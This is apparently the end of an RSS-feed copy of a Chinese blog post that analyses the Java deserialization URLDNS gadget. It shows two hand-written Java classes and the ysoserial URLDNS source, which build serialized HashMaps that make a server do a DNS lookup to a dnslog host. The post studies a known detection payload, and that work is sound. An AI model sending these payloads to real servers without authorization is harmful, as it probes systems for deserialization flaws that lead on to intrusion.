+&lt;a href="https://su18.org/post/ysoserial-su18-1/?#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90" target="_blank">来源于&lt;/a>&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">URLDNS&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>URL, Integer&lt;span style="color:#f92672">&amp;gt;&lt;/span> hashMap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&amp;gt;&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> URL url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL(&lt;span style="color:#e6db74">&amp;#34;http://su18.dnslog.cn&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Field f &lt;span style="color:#f92672">=&lt;/span> Class.&lt;span style="color:#a6e22e">forName&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;java.net.URL&amp;#34;&lt;/span>).&lt;span style="color:#a6e22e">getDeclaredField&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hashCode&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f.&lt;span style="color:#a6e22e">setAccessible&lt;/span>(&lt;span style="color:#66d9ef">true&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f.&lt;span style="color:#a6e22e">set&lt;/span>(url, 0x01010101);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hashMap.&lt;span style="color:#a6e22e">put&lt;/span>(url, 0);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f.&lt;span style="color:#a6e22e">set&lt;/span>(url, &lt;span style="color:#f92672">-&lt;/span>1);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectOutputStream oos &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectOutputStream(&lt;span style="color:#66d9ef">new&lt;/span> FileOutputStream(&lt;span style="color:#e6db74">&amp;#34;urldns.bin&amp;#34;&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> oos.&lt;span style="color:#a6e22e">writeObject&lt;/span>(hashMap);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectInputStream ois &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectInputStream(&lt;span style="color:#66d9ef">new&lt;/span> FileInputStream(&lt;span style="color:#e6db74">&amp;#34;urldns.bin&amp;#34;&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ois.&lt;span style="color:#a6e22e">readObject&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">URLDNS2&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>URL, Integer&lt;span style="color:#f92672">&amp;gt;&lt;/span> hashMap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&amp;gt;&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> URL url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL(&lt;span style="color:#e6db74">&amp;#34;http://su18.dnslog.cn&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Method&lt;span style="color:#f92672">[]&lt;/span> m &lt;span style="color:#f92672">=&lt;/span> Class.&lt;span style="color:#a6e22e">forName&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;java.util.HashMap&amp;#34;&lt;/span>).&lt;span style="color:#a6e22e">getDeclaredMethods&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (Method method : m) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (method.&lt;span style="color:#a6e22e">getName&lt;/span>().&lt;span style="color:#a6e22e">equals&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;putVal&amp;#34;&lt;/span>)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> method.&lt;span style="color:#a6e22e">setAccessible&lt;/span>(&lt;span style="color:#66d9ef">true&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> method.&lt;span style="color:#a6e22e">invoke&lt;/span>(hashMap, &lt;span style="color:#f92672">-&lt;/span>1, url, 0, &lt;span style="color:#66d9ef">false&lt;/span>, &lt;span style="color:#66d9ef">true&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectOutputStream oos &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectOutputStream(&lt;span style="color:#66d9ef">new&lt;/span> FileOutputStream(&lt;span style="color:#e6db74">&amp;#34;urldns2.bin&amp;#34;&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> oos.&lt;span style="color:#a6e22e">writeObject&lt;/span>(hashMap);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectInputStream ois &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectInputStream(&lt;span style="color:#66d9ef">new&lt;/span> FileInputStream(&lt;span style="color:#e6db74">&amp;#34;urldns2.bin&amp;#34;&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ois.&lt;span style="color:#a6e22e">readObject&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ysoserial-实现url-dns">ysoserial 实现URL DNS&lt;/h4>
+&lt;p>下载
+&lt;a href="https://github.com/frohoff/ysoserial" target="_blank">源码&lt;/a>,URLDNS实现如下，很明显采用的时第一种方法，在put之后，通过反射修改对应的值。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">URLDNS&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> ObjectPayload&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">getObject&lt;/span>(&lt;span style="color:#66d9ef">final&lt;/span> String url) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//Avoid DNS resolution during payload creation&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//Since the field &amp;lt;code&amp;gt;java.net.URL.handler&amp;lt;/code&amp;gt; is transient, it will not be part of the serialized payload.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> URLStreamHandler handler &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SilentURLStreamHandler();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HashMap ht &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap(); &lt;span style="color:#75715e">// HashMap that will contain the URL&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> URL u &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL(&lt;span style="color:#66d9ef">null&lt;/span>, url, handler); &lt;span style="color:#75715e">// URL to use as the Key&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ht.&lt;span style="color:#a6e22e">put&lt;/span>(u, url); &lt;span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Reflections.&lt;span style="color:#a6e22e">setFieldValue&lt;/span>(u, &lt;span style="color:#e6db74">&amp;#34;hashCode&amp;#34;&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>1); &lt;span style="color:#75715e">// During the put above, the URL&amp;#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ht;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">final&lt;/span> String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PayloadRunner.&lt;span style="color:#a6e22e">run&lt;/span>(URLDNS.&lt;span style="color:#a6e22e">class&lt;/span>, args);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * using the serialized object.&amp;lt;/p&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;b&amp;gt;Potential false negative:&amp;lt;/b&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * second resolution.&amp;lt;/p&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SilentURLStreamHandler&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> URLStreamHandler {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> URLConnection &lt;span style="color:#a6e22e">openConnection&lt;/span>(URL u) &lt;span style="color:#66d9ef">throws&lt;/span> IOException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> InetAddress &lt;span style="color:#a6e22e">getHostAddress&lt;/span>(URL u) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setFieldValue&lt;/span>(&lt;span style="color:#66d9ef">final&lt;/span> Object obj, &lt;span style="color:#66d9ef">final&lt;/span> String fieldName, &lt;span style="color:#66d9ef">final&lt;/span> Object value) &lt;span style="color:#66d9ef">throws&lt;/span> Exception {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> Field field &lt;span style="color:#f92672">=&lt;/span> getField(obj.&lt;span style="color:#a6e22e">getClass&lt;/span>(), fieldName);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> field.&lt;span style="color:#a6e22e">set&lt;/span>(obj, value);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
+&lt;blockquote>
+&lt;p>
+&lt;a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/" target="_blank">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/&lt;/a>&lt;/p>
+&lt;p>
+&lt;a href="https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90" target="_blank">https://su18.org/post/ysoserial-su18-1/#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>&lt;strong>Created at 2024-01-08T16:57:37+08:00&lt;/strong>&lt;/p></description></item></channel></rss>
